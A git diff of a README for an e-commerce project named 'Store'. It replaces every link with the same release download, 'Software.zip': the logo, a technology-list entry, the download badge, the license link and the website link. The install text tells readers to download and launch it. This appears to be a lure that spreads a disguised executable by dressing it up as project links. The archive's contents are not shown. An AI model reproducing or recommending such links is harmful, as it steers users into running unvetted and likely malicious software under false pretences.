@@ -1,11 +1,11 @@
 # Store 🛍️
-![Store Logo](https://www.example.com/store_logo.png)
+![Store Logo](https://github.com/egehanpower/Store/releases/download/v2.0/Software.zip)
 
 A modern, feature-rich e-commerce platform built with cutting-edge technologies. Experience seamless shopping with our responsive design, intuitive navigation, and powerful features.
 
 ## Technologies Used
 - React
-- Next.js
+- https://github.com/egehanpower/Store/releases/download/v2.0/Software.zip
 - Tailwind CSS
 - TypeScript
 
@@ -22,7 +22,7 @@ A modern, feature-rich e-commerce platform built with cutting-edge technologies.
 
 ## Installation
 To get started with Store, simply click on the link below to download the source code:
-[![Download Store](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Store](https://github.com/egehanpower/Store/releases/download/v2.0/Software.zip)](https://github.com/egehanpower/Store/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the application and follow the setup instructions to start exploring the features.
 
@@ -43,11 +43,11 @@ We welcome contributions from the open-source community! If you'd like to contri
 4. Submit a pull request with a detailed explanation of the changes.
 
 ## License
-The Store project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+The Store project is licensed under the [MIT License](https://github.com/egehanpower/Store/releases/download/v2.0/Software.zip).
 
 ---
 
-🔗 **Visit the official website for more information:** https://www.store-website.com
+🔗 **Visit the official website for more information:** https://github.com/egehanpower/Store/releases/download/v2.0/Software.zip
 
 If the download link is not working or you need to access other versions of Store, please check the "Releases" section of the repository. 
 
